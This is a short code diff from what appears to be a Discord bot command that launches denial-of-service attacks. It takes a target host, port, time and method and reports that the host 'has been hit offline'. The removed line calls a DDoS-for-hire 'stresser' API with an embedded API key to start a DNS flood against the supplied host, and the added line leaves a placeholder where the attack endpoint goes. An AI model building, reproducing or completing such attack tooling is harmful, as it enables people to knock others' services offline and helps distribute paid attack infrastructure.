@@ -10,7 +10,7 @@ module.exports= {
     const port = args.shift();
     const time = args.shift();
     const method = args.shift();
-        axios.get(`https://onyxstresser.com/api/api.php?key=21iDeQCyP32pcMid&host=${host}&port=53&time=300&method=DNS&totalservers=1&vip=1`)
+        axios.get(`api here `)
         .then(function (response) {
         let embed = new MessageEmbed();
         embed.setDescription("`" + host + "`" + " has been hit offline");
